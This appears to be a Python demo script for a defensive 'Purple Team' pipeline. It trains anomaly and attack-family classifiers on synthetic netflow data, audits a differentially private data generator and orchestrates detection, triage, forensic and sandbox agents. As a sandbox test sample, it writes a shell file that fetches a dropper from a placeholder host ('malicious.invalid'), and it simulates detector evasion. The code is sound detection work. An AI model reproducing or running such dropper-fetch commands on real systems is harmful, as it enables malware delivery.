"""Demo end-to-end Purple Team con datos tabulares mixtos, LVGAN, MoE, PPML DP-SGD,
agentes autónomos, sandbox estático y ledger de evidencias tamper-evident.
"""
from __future__ import annotations

import asyncio
import json
import tempfile
from pathlib import Path

import numpy as np
from sklearn.metrics import roc_auc_score

from pfai.agents.orchestrator import (
    Bus,
    DetectorAgent,
    ForensicAgent,
    RedTeamAgent,
    ReportAgent,
    SandboxAgent,
    TriageAgent,
)
from pfai.data.synthetic_flows import generate_netflow_dataset
from pfai.integrity.ledger import EvidenceLedger
from pfai.models.lvgan import LVGAN, LVGANConfig
from pfai.models.moe import FAMILIES, MoEClassifier
from pfai.preprocess import TabularEncoder
from pfai.privacy.audit import full_report, privacy_utility_verdict
from pfai.privacy.synth import DPTabGAN
from pfai.sandbox.sandbox import StaticFallbackSandbox
from pfai.tools.forensics import Scope


def run_demo(ledger_path: str = "demo_ledger.jsonl", epochs: int = 30) -> dict:
    df = generate_netflow_dataset(
        counts={"benign": 900, "dos": 200, "probe": 200, "bruteforce": 160, "exfil": 160},
        seed=42,
    )
    feat_cols = [c for c in df.columns if c != "family"]
    enc = TabularEncoder.from_dataframe(df, exclude=["family"]).fit(df[feat_cols])
    X_all = enc.transform(df[feat_cols])
    y_all = df["family"].map({name: i for i, name in enumerate(FAMILIES)}).to_numpy()

    benign = X_all[y_all == 0]
    attacks = X_all[y_all != 0]
    split_b = int(len(benign) * 0.8)
    X_tr, X_val = benign[:split_b], benign[split_b:]

    # 1) LVGAN: detección de anomalías + generación Purple Team
    lv = LVGAN(
        LVGANConfig(d_in=X_all.shape[1], d_z=8, hidden=64, lr=1e-3, beta=0.05, batch_size=64, epochs=max(epochs, 40))
    ).fit(X_tr)
    lv.calibrate(X_val, 0.99)
    auc = roc_auc_score(
        np.r_[np.zeros(len(X_val)), np.ones(len(attacks))],
        lv.score(np.vstack([X_val, attacks])),
    )
    print(f"AUC detección de anomalías (LVGAN): {auc:.3f}")

    # 2) MoE: clasificación especializada por familia
    moe = MoEClassifier(X_all.shape[1]).fit(X_all, y_all, epochs=epochs, class_weights="balanced")
    moe_eval = moe.evaluate(X_all, y_all)
    print(f"MoE accuracy={moe_eval['accuracy']:.3f} macro_f1={moe_eval['macro_f1']:.3f}")

    # 3) PPML: DPTabGAN con DP-SGD + auditoría de utilidad vs privacidad
    split_df = int(len(df) * 0.7)
    train_df, holdout_df = df.iloc[:split_df].reset_index(drop=True), df.iloc[split_df:].reset_index(drop=True)
    enc_ppml = TabularEncoder.from_dataframe(train_df).fit(train_df)
    X_ppml = enc_ppml.transform(train_df)
    dp = DPTabGAN(
        d_in=X_ppml.shape[1], epsilon=5.0, epochs=25, batch_size=128, lr=1e-3, encoder=enc_ppml
    ).fit(X_ppml, verbose=False)
    synth_df = dp.sample_df(len(train_df))
    ppml_rep = full_report(train_df, holdout_df, synth_df, label="family")
    ppml_verdict = privacy_utility_verdict(ppml_rep, dp.privacy_report())
    print("PPML DP budget:", dp.privacy_report())

    # 4) Orquestación multiagente Purple Team + Sandbox + Ledger
    async def run_agents() -> dict:
        bus = Bus()
        DetectorAgent(bus, lv)
        TriageAgent(bus, moe)
        RedTeamAgent(bus, lv)
        ForensicAgent(bus, Scope(["10.0.0.0/8", "192.168.0.0/16"]))
        SandboxAgent(bus, StaticFallbackSandbox())
        rep = ReportAgent(bus, EvidenceLedger(ledger_path))

        # Flujos en vivo + campaña adversaria Red Team
        for idx in range(3):
            await bus.publish("flow", {"features": attacks[idx], "meta": {"dst_ip": "10.0.0.5", "kind": "live"}})
        await bus.publish("simulate", {"mode": "evasion", "seed_features": attacks[:4], "meta": {"dst_ip": "10.0.0.8"}})

        with tempfile.NamedTemporaryFile("wb", suffix=".sh", delete=False) as tf:
            tf.write(b"#!/bin/sh\nwget http://malicious.invalid/dropper.sh\n")
            sample_path = tf.name
        try:
            await bus.publish("sample", {"path": sample_path, "origin": "demo"})
            await bus.run()
        finally:
            Path(sample_path).unlink(missing_ok=True)
        return rep.summary()

    agent_summary = asyncio.run(run_agents())
    out = {
        "lvgan_auc": round(float(auc), 4),
        "moe_eval": moe_eval,
        "ppml": {
            "budget": dp.privacy_report(),
            "fidelity": ppml_rep["fidelity"],
            "duplicates": ppml_rep["duplicates"],
            "mia_auc": ppml_rep["mia_auc"],
            "verdict": ppml_verdict,
        },
        "agents": agent_summary,
    }
    print(json.dumps(out, indent=2, ensure_ascii=False))
    return out


if __name__ == "__main__":
    run_demo()
